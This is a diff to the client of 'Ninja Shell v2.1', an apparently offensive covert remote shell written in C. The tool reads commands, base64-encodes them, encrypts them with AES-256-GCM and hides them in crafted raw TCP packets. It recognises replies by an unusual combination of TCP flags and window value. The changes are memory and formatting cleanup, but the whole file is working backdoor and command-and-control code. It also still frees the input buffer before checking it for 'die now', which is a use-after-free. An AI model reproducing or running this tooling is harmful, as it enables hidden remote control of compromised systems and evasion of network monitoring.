@@ -60,10 +60,8 @@ Custom raw socket client shell using AES256-GCM
 #include <stdint.h>
 #include <stddef.h>
 
-#define XFREE(x) xfree((void **)x);
 #define MUL_NO_OVERFLOW ((size_t)1 << (sizeof(size_t)*4))
 void *xmallocarray (size_t nmemb, size_t size);
-void xfree(void **ptr);
 
 char *encode64 (const void *b64_encode_this, int encode_this_many_bytes);
 char *decode64 (const void *b64_decode_this, int decode_this_many_bytes);
@@ -96,8 +94,7 @@ void init_serv()
 int main(int argc, char *argv[]) 
 {
    char IP[16]; 
-   char *destino=NULL;
-
+   
   	if(argc < 2) 
   	{
   		puts("follow example ./proc host\n Ninja Shell v2.1\nCustom Raw socket client server shell using AES256-GCM  \n by Cooler_ \n contact: coolerlair[at]gmail[dot]com\n");
@@ -113,31 +110,30 @@ int main(int argc, char *argv[])
 	fprintf(stdout,"\nIP: %s \n",IP);    
   //fprintf(stdout,"fate  : %s\n",argv[1]);    
      
-	destino=(char *)alloca(sizeof(IP)+1);
-  memset(destino,0,sizeof(IP));  
+	char destino[17];
+  	memset(destino,'\0',17);  
 	strncpy(destino,IP, (sizeof(IP)) );
 
 	init_serv();
 
   	while(1) 
   	{     
-      unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
-
+      		unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
    		char *input=xmallocarray(MAX+1,sizeof(char));
-  		bzero(input, MAX);
+  		bzero(input, MAX+1);
   		fprintf(stdout,"CMD:");
   	   	if(fgets(input,MAX,stdin)==NULL)
   			   exit(0); 
-      unsigned char *encode_64_input=encode64(input,strlen((char *)input));
-      k = encrypt(encode_64_input, strlen(encode_64_input), aad, sizeof(aad), key, iv, ciphertext, tag);
+      		unsigned char *encode_64_input=encode64(input,strlen((char *)input));
+      		k = encrypt(encode_64_input, strlen(encode_64_input), aad, sizeof(aad), key, iv, ciphertext, tag);
      //       printf("Debug input ciphertext: %s --\n",ciphertext);
-      char *encode_64_output=encode64(ciphertext,strlen((char *)ciphertext));
+      		char *encode_64_output=encode64(ciphertext,strlen((char *)ciphertext));
      //       printf("Debug input encode_64_output: %s --\n",encode_64_output);
 
   		fazerpacote(destino, PORT,encode_64_output);
   		free(encode_64_input);
-      free(encode_64_output);
-      free(input);
+      		free(encode_64_output);
+      		free(input);
   		
   		if(strstr(input,"die now"))
   		{
@@ -173,16 +169,6 @@ void *xmallocarray (size_t nmemb, size_t size)
   return ptr;
 }
 
-void xfree(void **ptr) 
-{
-  assert(ptr);
-  if( ptr != NULL )
-        {
-    free(*ptr);
-    *ptr=NULL;  
-        }
-  
-}
      
 void fazerpacote(char *dest_addr, unsigned short dest_port, char * payload)
 {    
@@ -395,17 +381,16 @@ void listening_raw()
    	{
     		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) &&(tcphr->urg == 1) && (tcphr->window == htons(10666))) 
     		{
-          unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
+          		unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
 
      			counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
-      		unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
-          k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
+      			unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
+          		k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
 
-          char *decode_64_output=decode64(pt,strlen(pt)-4);
-          fprintf(stdout,"Result: %s \n",decode_64_output);
-          free(decode_64_output);
-          free(decode_64_input);
-
+         		char *decode_64_output=decode64(pt,strlen(pt)-4);
+          		fprintf(stdout,"Result: %s \n",decode_64_output);
+          		free(decode_64_output);
+          		free(decode_64_input);
 // todo free the heap...  add xfree() function here
 
 
